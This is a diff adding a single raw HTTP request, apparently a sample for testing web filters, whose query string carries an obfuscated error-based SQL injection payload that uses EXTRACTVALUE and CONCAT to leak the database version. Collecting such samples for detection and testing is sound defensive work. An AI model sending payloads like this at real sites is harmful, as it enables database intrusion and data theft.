@@ -1,0 +1,6 @@
+GET /index.php?q=%27%250bCHAR%2897%2C78%2C100%29%2509ExtrACTValue%281%2CcoNcaT%280X7E%2CversioN%28%29%29%29-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
